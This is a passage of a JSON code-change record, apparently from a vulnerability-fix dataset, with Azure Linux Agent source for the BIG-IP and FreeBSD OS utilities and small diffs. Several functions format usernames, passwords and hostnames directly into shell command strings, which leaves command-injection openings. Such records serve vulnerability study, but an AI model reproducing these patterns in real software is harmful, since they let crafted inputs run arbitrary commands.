I proceed with the stock code. :param max_retry: Maximum number of retries waagent will make when mounting the provisioningiso.iso DVD :param chk_err: Whether to check for errors or not in the mounting commands \"\"\" self._wait_until_mcpd_is_initialized() return super(BigIpOSUtil, self).mount_dvd(**kwargs) def eject_dvd(self, chk_err=True): \"\"\"Runs the eject command to eject the provisioning DVD BIG-IP does not include an eject command. It is sufficient to just umount the DVD disk. But I will log that we do not support this for future reference. :param chk_err: Whether or not to check for errors raised by the eject command \"\"\" logger.warn(\"Eject is not supported on this platform\") def get_first_if(self): \"\"\"Return the interface name, and ip addr of the management interface. We need to add a struct_size check here because, curiously, our 64bit platform is identified by python in Azure(Stack) as 32 bit and without adjusting the struct_size, we can't get the information we need. I believe this may be caused by only python i686 being shipped with BIG-IP instead of python x86_64?? \"\"\" iface='' expected=16 python_arc=platform.architecture()[0] if python_arc=='64bit': struct_size=40 else: struct_size=32 sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) buff=array.array('B', b'\\0' *(expected * struct_size)) param=struct.pack('iL', expected*struct_size, buff.buffer_info()[0]) ret=fcntl.ioctl(sock.fileno(), 0x8912, param) retsize=(struct.unpack('iL', ret)[0]) if retsize==(expected * struct_size): logger.warn(('SIOCGIFCONF returned more than{0} up ' 'network interfaces.'), expected) sock=buff.tostring() for i in range(0, struct_size * expected, struct_size): iface=self._format_single_interface_name(sock, i) if b'lo' in iface: continue else: break return iface.decode('latin-1'), socket.inet_ntoa(sock[i+20:i+24]) def _format_single_interface_name(self, sock, offset): return sock[offset:offset+16].split(b'\\0', 1)[0] def route_add(self, net, mask, gateway): \"\"\"Add specified route using tmsh. :param net: :param mask: :param gateway: :return: \"\"\" cmd=(\"/usr/bin/tmsh create net route \" \"{0}/{1} gw{2}\").format(net, mask, gateway) return shellutil.run(cmd, chk_err=False) def device_for_ide_port(self, port_id): \"\"\"Return device name attached to ide port 'n'. Include a wait in here because BIG-IP may not have yet initialized this list of devices. :param port_id: :return: \"\"\" for retries in range(1, 100): if os.path.exists(\"/sys/bus/vmbus/devices/\"): break else: time.sleep(10) return super(BigIpOSUtil, self).device_for_ide_port(port_id) ", "sourceWithComments": "# Copyright 2016 F5 Networks Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# Requires Python 2.6+ and Openssl 1.0+\n#\n\nimport array\nimport fcntl\nimport os\nimport platform\nimport re\nimport socket\nimport struct\nimport time\n\ntry:\n    # WAAgent > 2.1.3\n    import azurelinuxagent.common.logger as logger\n    import azurelinuxagent.common.utils.shellutil as shellutil\n\n    from azurelinuxagent.common.exception import OSUtilError\n    from azurelinuxagent.common.osutil.default import DefaultOSUtil\nexcept ImportError:\n    # WAAgent <= 2.1.3\n    import azurelinuxagent.logger as logger\n    import azurelinuxagent.utils.shellutil as shellutil\n\n    from azurelinuxagent.exception import OSUtilError\n    from azurelinuxagent.distro.default.osutil import DefaultOSUtil\n\n\nclass BigIpOSUtil(DefaultOSUtil):\n    def __init__(self):\n        super(BigIpOSUtil, self).__init__()\n\n    def _wait_until_mcpd_is_initialized(self):\n        \"\"\"Wait for mcpd to become available\n\n        All configuration happens in mcpd so we need to wait that this is\n        available before we go provisioning the system. I call this method\n        at the first opportunity I have (during the DVD mounting call).\n        This ensures that the rest of the provisioning does not need to wait\n        for mcpd to be available unless it absolutely wants to.\n\n        :return bool: Returns True upon success\n        :raises OSUtilError: Raises exception if mcpd does not come up within\n                             roughly 50 minutes (100 * 30 seconds)\n        \"\"\"\n        for retries in range(1, 100):\n            # Retry until mcpd completes startup:\n            logger.info(\"Checking to see if mcpd is up\")\n            rc = shellutil.run(\"/usr/bin/tmsh -a show sys mcp-state field-fmt 2>/dev/null | grep phase | grep running\", chk_err=False)\n            if rc == 0:\n                logger.info(\"mcpd is up!\")\n                break\n            time.sleep(30)\n\n        if rc is 0:\n            return True\n\n        raise OSUtilError(\n            \"mcpd hasn't completed initialization! Cannot proceed!\"\n        )\n\n    def _save_sys_config(self):\n        cmd = \"/usr/bin/tmsh save sys config\"\n        rc = shellutil.run(cmd)\n        if rc != 0:\n            logger.error(\"WARNING: Cannot save sys config on 1st boot.\")\n        return rc\n\n    def restart_ssh_service(self):\n        return shellutil.run(\"/usr/bin/bigstart restart sshd\", chk_err=False)\n\n    def stop_agent_service(self):\n        return shellutil.run(\"/sbin/service waagent stop\", chk_err=False)\n\n    def start_agent_service(self):\n        return shellutil.run(\"/sbin/service waagent start\", chk_err=False)\n\n    def register_agent_service(self):\n        return shellutil.run(\"/sbin/chkconfig --add waagent\", chk_err=False)\n\n    def unregister_agent_service(self):\n        return shellutil.run(\"/sbin/chkconfig --del waagent\", chk_err=False)\n\n    def get_dhcp_pid(self):\n        ret = shellutil.run_get_output(\"/sbin/pidof dhclient\")\n        return ret[1] if ret[0] == 0 else None\n\n    def set_hostname(self, hostname):\n        \"\"\"Set the static hostname of the device\n\n        Normally, tmsh is used to set the hostname for the system. For our\n        purposes at this time though, I would hesitate to trust this function.\n\n        Azure(Stack) uses the name that you provide in the Web UI or ARM (for\n        example) as the value of the hostname argument to this method. The\n        problem is that there is nowhere in the UI that specifies the\n        restrictions and checks that tmsh has for the hostname.\n\n        For example, if you set the name \"bigip1\" in the Web UI, Azure(Stack)\n        considers that a perfectly valid name. When WAAgent gets around to\n        running though, tmsh will reject that value because it is not a fully\n        qualified domain name. The proper value should have been bigip.xxx.yyy\n\n        WAAgent will not fail if this command fails, but the hostname will not\n        be what the user set either. Currently we do not set the hostname when\n        WAAgent starts up, so I am passing on setting it here too.\n\n        :param hostname: The hostname to set on the device\n        \"\"\"\n        return None\n\n    def set_dhcp_hostname(self, hostname):\n        \"\"\"Sets the DHCP hostname\n\n        See `set_hostname` for an explanation of why I pass here\n\n        :param hostname: The hostname to set on the device\n        \"\"\"\n        return None\n\n    def useradd(self, username, expiration=None):\n        \"\"\"Create user account using tmsh\n\n        Our policy is to create two accounts when booting a BIG-IP instance.\n        The first account is the one that the user specified when they did\n        the instance creation. The second one is the admin account that is,\n        or should be, built in to the system.\n\n        :param username: The username that you want to add to the system\n        :param expiration: The expiration date to use. We do not use this\n                           value.\n        \"\"\"\n        if self.get_userentry(username):\n            logger.info(\"User {0} already exists, skip useradd\", username)\n            return None\n\n        cmd = \"/usr/bin/tmsh create auth user %s partition-access add { all-partitions { role admin } } shell bash\" % (username)\n        retcode, out = shellutil.run_get_output(cmd, log_cmd=True, chk_err=True)\n        if retcode != 0:\n            raise OSUtilError(\n                \"Failed to create user account:{0}, retcode:{1}, output:{2}\".format(username, retcode, out)\n            )\n        self._save_sys_config()\n        return retcode\n\n    def chpasswd(self, username, password, crypt_id=6, salt_len=10):\n        \"\"\"Change a user's password with tmsh\n\n        Since we are creating the user specified account and additionally\n        changing the password of the built-in 'admin' account, both must\n        be modified in this method.\n\n        Note that the default method also checks for a \"system level\" of the\n        user; based on the value of UID_MIN in /etc/login.defs. In our env,\n        all user accounts have the UID 0. So we can't rely on this value.\n\n        :param username: The username whose password to change\n        :param password: The unencrypted password to set for the user\n        :param crypt_id: If encrypting the password, the crypt_id that was used\n        :param salt_len: If encrypting the password, the length of the salt\n                         value used to do it.\n        \"\"\"\n\n        # Start by setting the password of the user provided account\n        cmd = \"/usr/bin/tmsh modify auth user {0} password '{1}'\".format(username, password)\n        ret, output = shellutil.run_get_output(cmd, log_cmd=False, chk_err=True)\n        if ret != 0:\n            raise OSUtilError(\n                \"Failed to set password for {0}: {1}\".format(username, output)\n            )\n\n        # Next, set the password of the built-in 'admin' account to be have\n        # the same password as the user provided account\n        userentry = self.get_userentry('admin')\n        if userentry is None:\n            raise OSUtilError(\"The 'admin' user account was not found!\")\n\n        cmd = \"/usr/bin/tmsh modify auth user 'admin' password '{0}'\".format(password)\n        ret, output = shellutil.run_get_output(cmd, log_cmd=False, chk_err=True)\n        if ret != 0:\n            raise OSUtilError(\n                \"Failed to set password for 'admin': {0}\".format(output)\n            )\n        self._save_sys_config()\n        return ret\n\n    def del_account(self, username):\n        \"\"\"Deletes a user account.\n\n        Note that the default method also checks for a \"system level\" of the\n        user; based on the value of UID_MIN in /etc/login.defs. In our env,\n        all user accounts have the UID 0. So we can't rely on this value.\n\n        We also don't use sudo, so we remove that method call as well.\n\n        :param username:\n        :return:\n        \"\"\"\n        shellutil.run(\"> /var/run/utmp\")\n        shellutil.run(\"/usr/bin/tmsh delete auth user \" + username)\n\n    def get_dvd_device(self, dev_dir='/dev'):\n        \"\"\"Find BIG-IP's CD/DVD device\n\n        This device is almost certainly /dev/cdrom so I added the ? to this pattern.\n        Note that this method will return upon the first device found, but in my\n        tests with 12.1.1 it will also find /dev/sr0 on occasion. This is NOT the\n        correct CD/DVD device though.\n\n        :todo: Consider just always returning \"/dev/cdrom\" here if that device device\n               exists on all platforms that are supported on Azure(Stack)\n        :param dev_dir: The root directory from which to look for devices\n        \"\"\"\n        patten = r'(sr[0-9]|hd[c-z]|cdrom[0-9]?)'\n        for dvd in [re.match(patten, dev) for dev in os.listdir(dev_dir)]:\n            if dvd is not None:\n                return \"/dev/{0}\".format(dvd.group(0))\n        raise OSUtilError(\"Failed to get dvd device\")\n\n    def mount_dvd(self, **kwargs):\n        \"\"\"Mount the DVD containing the provisioningiso.iso file\n\n        This is the _first_ hook that WAAgent provides for us, so this is the\n        point where we should wait for mcpd to load. I am just overloading\n        this method to add the mcpd wait. Then I proceed with the stock code.\n\n        :param max_retry: Maximum number of retries waagent will make when\n                          mounting the provisioningiso.iso DVD\n        :param chk_err: Whether to check for errors or not in the mounting\n                        commands\n        \"\"\"\n        self._wait_until_mcpd_is_initialized()\n        return super(BigIpOSUtil, self).mount_dvd(**kwargs)\n\n    def eject_dvd(self, chk_err=True):\n        \"\"\"Runs the eject command to eject the provisioning DVD\n\n        BIG-IP does not include an eject command. It is sufficient to just\n        umount the DVD disk. But I will log that we do not support this for\n        future reference.\n\n        :param chk_err: Whether or not to check for errors raised by the eject\n                        command\n        \"\"\"\n        logger.warn(\"Eject is not supported on this platform\")\n\n    def get_first_if(self):\n        \"\"\"Return the interface name, and ip addr of the management interface.\n\n        We need to add a struct_size check here because, curiously, our 64bit\n        platform is identified by python in Azure(Stack) as 32 bit and without\n        adjusting the struct_size, we can't get the information we need.\n\n        I believe this may be caused by only python i686 being shipped with\n        BIG-IP instead of python x86_64??\n        \"\"\"\n        iface = ''\n        expected = 16  # how many devices should I expect...\n\n        python_arc = platform.architecture()[0]\n        if python_arc == '64bit':\n            struct_size = 40  # for 64bit the size is 40 bytes\n        else:\n            struct_size = 32  # for 32bit the size is 32 bytes\n        sock = socket.socket(socket.AF_INET,\n                             socket.SOCK_DGRAM,\n                             socket.IPPROTO_UDP)\n        buff = array.array('B', b'\\0' * (expected * struct_size))\n        param = struct.pack('iL',\n                            expected*struct_size,\n                            buff.buffer_info()[0])\n        ret = fcntl.ioctl(sock.fileno(), 0x8912, param)\n        retsize = (struct.unpack('iL', ret)[0])\n        if retsize == (expected * struct_size):\n            logger.warn(('SIOCGIFCONF returned more than {0} up '\n                         'network interfaces.'), expected)\n        sock = buff.tostring()\n        for i in range(0, struct_size * expected, struct_size):\n            iface = self._format_single_interface_name(sock, i)\n\n            # Azure public was returning \"lo:1\" when deploying WAF\n            if b'lo' in iface:\n                continue\n            else:\n                break\n        return iface.decode('latin-1'), socket.inet_ntoa(sock[i+20:i+24])\n\n    def _format_single_interface_name(self, sock, offset):\n        return sock[offset:offset+16].split(b'\\0', 1)[0]\n\n    def route_add(self, net, mask, gateway):\n        \"\"\"Add specified route using tmsh.\n\n        :param net:\n        :param mask:\n        :param gateway:\n        :return:\n        \"\"\"\n        cmd = (\"/usr/bin/tmsh create net route \"\n               \"{0}/{1} gw {2}\").format(net, mask, gateway)\n        return shellutil.run(cmd, chk_err=False)\n\n    def device_for_ide_port(self, port_id):\n        \"\"\"Return device name attached to ide port 'n'.\n\n        Include a wait in here because BIG-IP may not have yet initialized\n        this list of devices.\n\n        :param port_id:\n        :return:\n        \"\"\"\n        for retries in range(1, 100):\n            # Retry until devices are ready\n            if os.path.exists(\"/sys/bus/vmbus/devices/\"):\n                break\n            else:\n                time.sleep(10)\n        return super(BigIpOSUtil, self).device_for_ide_port(port_id)\n"}, "/azurelinuxagent/common/osutil/default.py": {"changes": [{"diff": "\n         else:\n             return False\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"\n         Create user account with 'username'\n         \"\"\"\n", "add": 1, "remove": 1, "filename": "/azurelinuxagent/common/osutil/default.py", "badparts": ["    def useradd(self, username, expiration=None):"], "goodparts": ["    def useradd(self, username, expiration=None, comment=None):"]}]}, "/azurelinuxagent/common/osutil/freebsd.py": {"changes": [{"diff": "\n     def restart_ssh_service(self):\n         return shellutil.run('service sshd restart', chk_err=False)\n \n-    def useradd(self, username, expiration=None):\n+    def useradd(self, username, expiration=None, comment=None):\n         \"\"\"\n         Create user account with 'username'\n         \"\"\"\n", "add": 1, "remove": 1, "filename": "/azurelinuxagent/common/osutil/freebsd.py", "badparts": ["    def useradd(self, username, expiration=None):"], "goodparts": ["    def useradd(self, username, expiration=None, comment=None):"]}], "source": "\n import azurelinuxagent.common.utils.fileutil as fileutil import azurelinuxagent.common.utils.shellutil as shellutil import azurelinuxagent.common.utils.textutil as textutil import azurelinuxagent.common.logger as logger from azurelinuxagent.common.exception import OSUtilError from azurelinuxagent.common.osutil.default import DefaultOSUtil from azurelinuxagent.common.future import ustr class FreeBSDOSUtil(DefaultOSUtil): def __init__(self): super(FreeBSDOSUtil, self).__init__() self._scsi_disks_timeout_set=False def set_hostname(self, hostname): rc_file_path='/etc/rc.conf' conf_file=fileutil.read_file(rc_file_path).split(\"\\n\") textutil.set_ini_config(conf_file, \"hostname\", hostname) fileutil.write_file(rc_file_path, \"\\n\".join(conf_file)) shellutil.run(\"hostname{0}\".format(hostname), chk_err=False) def restart_ssh_service(self): return shellutil.run('service sshd restart', chk_err=False) def useradd(self, username, expiration=None): \"\"\" Create user account with 'username' \"\"\" userentry=self.get_userentry(username) if userentry is not None: logger.warn(\"User{0} already exists, skip useradd\", username) return if expiration is not None: cmd=\"pw useradd{0} -e{1} -m\".format(username, expiration) else: cmd=\"pw useradd{0} -m\".format(username) retcode, out=shellutil.run_get_output(cmd) if retcode !=0: raise OSUtilError((\"Failed to create user account:{0}, \" \"retcode:{1}, \" \"output:{2}\").format(username, retcode, out)) def del_account(self, username): if self.is_sys_user(username): logger.error(\"{0} is a system user. Will not delete it.\", username) shellutil.run('> /var/run/utx.active') shellutil.run('rmuser -y ' +username) self.conf_sudoer(username, remove=True) def chpasswd(self, username, password, crypt_id=6, salt_len=10): if self.is_sys_user(username): raise OSUtilError((\"User{0} is a system user, \" \"will not set password.\").format(username)) passwd_hash=textutil.gen_password_hash(password, crypt_id, salt_len) cmd=\"echo '{0}'|pw usermod{1} -H 0 \".format(passwd_hash, username) ret, output=shellutil.run_get_output(cmd, log_cmd=False) if ret !=0: raise OSUtilError((\"Failed to set password for{0}:{1}\" \"\").format(username, output)) def del_root_password(self): err=shellutil.run('pw usermod root -h -') if err: raise OSUtilError(\"Failed to delete root password: Failed to update password database.\") def get_if_mac(self, ifname): data=self._get_net_info() if data[0]==ifname: return data[2].replace(':', '').upper() return None def get_first_if(self): return self._get_net_info()[:2] def route_add(self, net, mask, gateway): cmd='route add{0}{1}{2}'.format(net, gateway, mask) return shellutil.run(cmd, chk_err=False) def is_missing_default_route(self): \"\"\" For FreeBSD, the default broadcast goes to current default gw, not a all-ones broadcast address, need to specify the route manually to get it work in a VNET environment. SEE ALSO: man ip(4) IP_ONESBCAST, \"\"\" return True def is_dhcp_enabled(self): return True def start_dhcp_service(self): shellutil.run(\"/etc/rc.d/dhclient start{0}\".format(self.get_if_name()), chk_err=False) def allow_dhcp_broadcast(self): pass def set_route_for_dhcp_broadcast(self, ifname): return shellutil.run(\"route add 255.255.255.255 -iface{0}\".format(ifname), chk_err=False) def remove_route_for_dhcp_broadcast(self, ifname): shellutil.run(\"route delete 255.255.255.255 -iface{0}\".format(ifname), chk_err=False) def get_dhcp_pid(self): ret=shellutil.run_get_output(\"pgrep -n dhclient\", chk_err=False) return ret[1] if ret[0]==0 else None def eject_dvd(self, chk_err=True): dvd=self.get_dvd_device() retcode=shellutil.run(\"cdcontrol -f{0} eject\".format(dvd)) if chk_err and retcode !=0: raise OSUtilError(\"Failed to eject dvd: ret={0}\".format(retcode)) def restart_if(self, ifname): shellutil.run(\"/etc/rc.d/dhclient restart{0}\".format(ifname), chk_err=False) def get_total_mem(self): cmd=\"sysctl hw.physmem |awk '{print $2}'\" ret, output=shellutil.run_get_output(cmd) if ret: raise OSUtilError(\"Failed to get total memory:{0}\".format(output)) try: return int(output)/1024/1024 except ValueError: raise OSUtilError(\"Failed to get total memory:{0}\".format(output)) def get_processor_cores(self): ret, output=shellutil.run_get_output(\"sysctl hw.ncpu |awk '{print $2}'\") if ret: raise OSUtilError(\"Failed to get processor cores.\") try: return int(output) except ValueError: raise OSUtilError(\"Failed to get total memory:{0}\".format(output)) def set_scsi_disks_timeout(self, timeout): if self._scsi_disks_timeout_set: return ret, output=shellutil.run_get_output('sysctl kern.cam.da.default_timeout={0}'.format(timeout)) if ret: raise OSUtilError(\"Failed set SCSI disks timeout:{0}\".format(output)) self._scsi_disks_timeout_set=True def check_pid_alive(self, pid): return shellutil.run('ps -p{0}'.format(pid), chk_err=False)==0 @staticmethod def _get_net_info(): \"\"\" There is no SIOCGIFCONF on freeBSD -just parse ifconfig. Returns strings: iface, inet4_addr, and mac or 'None,None,None' if unable to parse. We will sleep and retry as the network must be up. \"\"\" iface='' inet='' mac='' err, output=shellutil.run_get_output('ifconfig -l ether', chk_err=False) if err: raise OSUtilError(\"Can't find ether interface:{0}\".format(output)) ifaces=output.split() if not ifaces: raise OSUtilError(\"Can't find ether interface.\") iface=ifaces[0] err, output=shellutil.run_get_output('ifconfig ' +iface, chk_err=False) if err: raise OSUtilError(\"Can't get info for interface:{0}\".format(iface)) for line in output.split('\\n'): if line.find('inet ') !=-1: inet=line.split()[1] elif line.find('ether ') !=-1: mac=line.split()[1] logger.verbose(\"Interface info:({0},{1},{2})\", iface, inet, mac) return iface, inet, mac def device_for_ide_port(self, port_id): \"\"\" Return device name attached to ide port 'n'. \"\"\" if port_id > 3: return None g0=\"00000000\" if port_id > 1: g0=\"00000001\" port_id=port_id -2 err, output=shellutil.run_get_output('sysctl dev.storvsc | grep pnpinfo | grep deviceid=') if err: return None g1=\"000\" +ustr(port_id) g0g1=\"{0}-{1}\".format(g0, g1) \"\"\" search 'X' from 'dev.storvsc.X.%pnpinfo: classid=32412632-86cb-44a2-9b5c-50d1417354f5 deviceid=00000000-0001-8899-0000-000000000000' \"\"\" cmd_search_ide=\"sysctl dev.storvsc | grep pnpinfo | grep deviceid={0}\".format(g0g1) err, output=shellutil.run_get_output(cmd_search_ide) if err: return None cmd_extract_id=cmd_search_ide +\"|awk -F. '{print $3}'\" err, output=shellutil.run_get_output(cmd_extract_id) \"\"\" try to search 'blkvscX' and 'storvscX' to find device name \"\"\" output=output.rstrip() cmd_search_blkvsc=\"camcontrol devlist -b | grep blkvsc{0} | awk '{{print $1}}'\".format(output) err, output=shellutil.run_get_output(cmd_search_blkvsc) if err==0: output=output.rstrip() cmd_search_dev=\"camcontrol devlist | grep{0} | awk -F \\( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'\".format(output) err, output=shellutil.run_get_output(cmd_search_dev) if err==0: for possible in output.rstrip().split(','): if not possible.startswith('pass'): return possible cmd_search_storvsc=\"camcontrol devlist -b | grep storvsc{0} | awk '{{print $1}}'\".format(output) err, output=shellutil.run_get_output(cmd_search_storvsc) if err==0: output=output.rstrip() cmd_search_dev=\"camcontrol devlist | grep{0} | awk -F \\( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'\".format(output) err, output=shellutil.run_get_output(cmd_search_dev) if err==0: for possible in output.rstrip().split(','): if not possible.startswith('pass'): return possible return None @staticmethod def get_total_cpu_ticks_since_boot(): return 0 ", "sourceWithComments": "# Microsoft Azure Linux Agent\n#\n# Copyright 2018 Microsoft Corporation\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# Requires Python 2.6+ and Openssl 1.0+\n\nimport azurelinuxagent.common.utils.fileutil as fileutil\nimport azurelinuxagent.common.utils.shellutil as shellutil\nimport azurelinuxagent.common.utils.textutil as textutil\nimport azurelinuxagent.common.logger as logger\nfrom azurelinuxagent.common.exception import OSUtilError\nfrom azurelinuxagent.common.osutil.default import DefaultOSUtil\nfrom azurelinuxagent.common.future import ustr\n\nclass FreeBSDOSUtil(DefaultOSUtil):\n    def __init__(self):\n        super(FreeBSDOSUtil, self).__init__()\n        self._scsi_disks_timeout_set = False\n\n    def set_hostname(self, hostname):\n        rc_file_path = '/etc/rc.conf'\n        conf_file = fileutil.read_file(rc_file_path).split(\"\\n\")\n        textutil.set_ini_config(conf_file, \"hostname\", hostname)\n        fileutil.write_file(rc_file_path, \"\\n\".join(conf_file))\n        shellutil.run(\"hostname {0}\".format(hostname), chk_err=False)\n\n    def restart_ssh_service(self):\n        return shellutil.run('service sshd restart', chk_err=False)\n\n    def useradd(self, username, expiration=None):\n        \"\"\"\n        Create user account with 'username'\n        \"\"\"\n        userentry = self.get_userentry(username)\n        if userentry is not None:\n            logger.warn(\"User {0} already exists, skip useradd\", username)\n            return\n\n        if expiration is not None:\n            cmd = \"pw useradd {0} -e {1} -m\".format(username, expiration)\n        else:\n            cmd = \"pw useradd {0} -m\".format(username)\n        retcode, out = shellutil.run_get_output(cmd)\n        if retcode != 0:\n            raise OSUtilError((\"Failed to create user account:{0}, \"\n                               \"retcode:{1}, \"\n                               \"output:{2}\").format(username, retcode, out))\n\n    def del_account(self, username):\n        if self.is_sys_user(username):\n            logger.error(\"{0} is a system user. Will not delete it.\", username)\n        shellutil.run('> /var/run/utx.active')\n        shellutil.run('rmuser -y ' + username)\n        self.conf_sudoer(username, remove=True)\n\n    def chpasswd(self, username, password, crypt_id=6, salt_len=10):\n        if self.is_sys_user(username):\n            raise OSUtilError((\"User {0} is a system user, \"\n                               \"will not set password.\").format(username))\n        passwd_hash = textutil.gen_password_hash(password, crypt_id, salt_len)\n        cmd = \"echo '{0}'|pw usermod {1} -H 0 \".format(passwd_hash, username)\n        ret, output = shellutil.run_get_output(cmd, log_cmd=False)\n        if ret != 0:\n            raise OSUtilError((\"Failed to set password for {0}: {1}\"\n                               \"\").format(username, output))\n\n    def del_root_password(self):\n        err = shellutil.run('pw usermod root -h -')\n        if err:\n            raise OSUtilError(\"Failed to delete root password: Failed to update password database.\")\n\n    def get_if_mac(self, ifname):\n        data = self._get_net_info()\n        if data[0] == ifname:\n            return data[2].replace(':', '').upper()\n        return None\n\n    def get_first_if(self):\n        return self._get_net_info()[:2]\n\n    def route_add(self, net, mask, gateway):\n        cmd = 'route add {0} {1} {2}'.format(net, gateway, mask)\n        return shellutil.run(cmd, chk_err=False)\n\n    def is_missing_default_route(self):\n        \"\"\"\n        For FreeBSD, the default broadcast goes to current default gw, not a all-ones broadcast address, need to\n        specify the route manually to get it work in a VNET environment.\n        SEE ALSO: man ip(4) IP_ONESBCAST,\n        \"\"\"\n        return True\n\n    def is_dhcp_enabled(self):\n        return True\n\n    def start_dhcp_service(self):\n        shellutil.run(\"/etc/rc.d/dhclient start {0}\".format(self.get_if_name()), chk_err=False)\n\n    def allow_dhcp_broadcast(self):\n        pass\n\n    def set_route_for_dhcp_broadcast(self, ifname):\n        return shellutil.run(\"route add 255.255.255.255 -iface {0}\".format(ifname), chk_err=False)\n\n    def remove_route_for_dhcp_broadcast(self, ifname):\n        shellutil.run(\"route delete 255.255.255.255 -iface {0}\".format(ifname), chk_err=False)\n\n    def get_dhcp_pid(self):\n        ret = shellutil.run_get_output(\"pgrep -n dhclient\", chk_err=False)\n        return ret[1] if ret[0] == 0 else None\n\n    def eject_dvd(self, chk_err=True):\n        dvd = self.get_dvd_device()\n        retcode = shellutil.run(\"cdcontrol -f {0} eject\".format(dvd))\n        if chk_err and retcode != 0:\n            raise OSUtilError(\"Failed to eject dvd: ret={0}\".format(retcode))\n\n    def restart_if(self, ifname):\n        # Restart dhclient only to publish hostname\n        shellutil.run(\"/etc/rc.d/dhclient restart {0}\".format(ifname), chk_err=False)\n\n    def get_total_mem(self):\n        cmd = \"sysctl hw.physmem |awk '{print $2}'\"\n        ret, output = shellutil.run_get_output(cmd)\n        if ret:\n            raise OSUtilError(\"Failed to get total memory: {0}\".format(output))\n        try:\n            return int(output)/1024/1024\n        except ValueError:\n            raise OSUtilError(\"Failed to get total memory: {0}\".format(output))\n\n    def get_processor_cores(self):\n        ret, output = shellutil.run_get_output(\"sysctl hw.ncpu |awk '{print $2}'\")\n        if ret:\n            raise OSUtilError(\"Failed to get processor cores.\")\n\n        try:\n            return int(output)\n        except ValueError:\n            raise OSUtilError(\"Failed to get total memory: {0}\".format(output))\n\n    def set_scsi_disks_timeout(self, timeout):\n        if self._scsi_disks_timeout_set:\n            return\n\n        ret, output = shellutil.run_get_output('sysctl kern.cam.da.default_timeout={0}'.format(timeout))\n        if ret:\n            raise OSUtilError(\"Failed set SCSI disks timeout: {0}\".format(output))\n        self._scsi_disks_timeout_set = True\n\n    def check_pid_alive(self, pid):\n        return shellutil.run('ps -p {0}'.format(pid), chk_err=False) == 0\n\n    @staticmethod\n    def _get_net_info():\n        \"\"\"\n        There is no SIOCGIFCONF\n        on freeBSD - just parse ifconfig.\n        Returns strings: iface, inet4_addr, and mac\n        or 'None,None,None' if unable to parse.\n        We will sleep and retry as the network must be up.\n        \"\"\"\n        iface = ''\n        inet = ''\n        mac = ''\n\n        err, output = shellutil.run_get_output('ifconfig -l ether', chk_err=False)\n        if err:\n            raise OSUtilError(\"Can't find ether interface:{0}\".format(output))\n        ifaces = output.split()\n        if not ifaces:\n            raise OSUtilError(\"Can't find ether interface.\")\n        iface = ifaces[0]\n\n        err, output = shellutil.run_get_output('ifconfig ' + iface, chk_err=False)\n        if err:\n            raise OSUtilError(\"Can't get info for interface:{0}\".format(iface))\n\n        for line in output.split('\\n'):\n            if line.find('inet ') != -1:\n                inet = line.split()[1]\n            elif line.find('ether ') != -1:\n                mac = line.split()[1]\n        logger.verbose(\"Interface info: ({0},{1},{2})\", iface, inet, mac)\n\n        return iface, inet, mac\n\n    def device_for_ide_port(self, port_id):\n        \"\"\"\n        Return device name attached to ide port 'n'.\n        \"\"\"\n        if port_id > 3:\n            return None\n        g0 = \"00000000\"\n        if port_id > 1:\n            g0 = \"00000001\"\n            port_id = port_id - 2\n        err, output = shellutil.run_get_output('sysctl dev.storvsc | grep pnpinfo | grep deviceid=')\n        if err:\n            return None\n        g1 = \"000\" + ustr(port_id)\n        g0g1 = \"{0}-{1}\".format(g0, g1)\n        \"\"\"\n        search 'X' from 'dev.storvsc.X.%pnpinfo: classid=32412632-86cb-44a2-9b5c-50d1417354f5 deviceid=00000000-0001-8899-0000-000000000000'\n        \"\"\"\n        cmd_search_ide = \"sysctl dev.storvsc | grep pnpinfo | grep deviceid={0}\".format(g0g1)\n        err, output = shellutil.run_get_output(cmd_search_ide)\n        if err:\n            return None\n        cmd_extract_id = cmd_search_ide + \"|awk -F . '{print $3}'\"\n        err, output = shellutil.run_get_output(cmd_extract_id)\n        \"\"\"\n        try to search 'blkvscX' and 'storvscX' to find device name\n        \"\"\"\n        output = output.rstrip()\n        cmd_search_blkvsc = \"camcontrol devlist -b | grep blkvsc{0} | awk '{{print $1}}'\".format(output)\n        err, output = shellutil.run_get_output(cmd_search_blkvsc)\n        if err == 0:\n            output = output.rstrip()\n            cmd_search_dev=\"camcontrol devlist | grep {0} | awk -F \\( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'\".format(output)\n            err, output = shellutil.run_get_output(cmd_search_dev)\n            if err == 0:\n                for possible in output.rstrip().split(','):\n                    if not possible.startswith('pass'):\n                        return possible\n\n        cmd_search_storvsc = \"camcontrol devlist -b | grep storvsc{0} | awk '{{print $1}}'\".format(output)\n        err, output = shellutil.run_get_output(cmd_search_storvsc)\n        if err == 0:\n            output = output.rstrip()\n            cmd_search_dev=\"camcontrol devlist | grep {0} | awk -F \\( '{{print $2}}'|sed -e 's/.*(//'| sed -e 's/).*//'\".format(output)\n            err, output = shellutil.run_get_output(cmd_search_dev)\n            if err == 0:\n                for possible in output.rstrip().split(','):\n                    if not possible.startswith('pass'):\n                        return possible\n        return None\n\n    @staticmethod\n    def get_total_cpu_ticks_since_boot():\n        return 0\n"}, "/azurelinuxagent/common/protocol/wire.py": {"changes": [{"diff": "\n                         if last_incarnation is not None and \\\n                                         last_incarnation == new_incarnation:\n                             # Goalstate is not updated.\n-                            return\n-\n+                            return                \n                 self.goal_state_flusher.flush(datetime.utcnow())\n \n                 self.goal_state = goal_state\n", "add": 1, "remove": 2, "filename": 